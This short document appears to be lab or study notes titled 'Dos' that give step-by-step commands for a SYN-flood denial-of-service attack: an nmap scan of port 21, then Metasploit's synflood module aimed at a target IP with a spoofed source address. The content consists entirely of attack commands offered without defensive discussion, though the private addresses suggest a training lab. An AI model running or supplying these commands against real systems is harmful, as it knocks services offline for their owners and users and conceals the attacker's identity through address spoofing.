# Dos

nmap -p 21 (Target IP address)

msfconsole

use auxiliary/dos/tcp/synflood 

show options and enter

set RHOST (Target IP Address) (here, 10.10.1.11)

set RPORT 21

set SHOST (Spoofable IP Address) (here, 10.10.1.19)

exploit

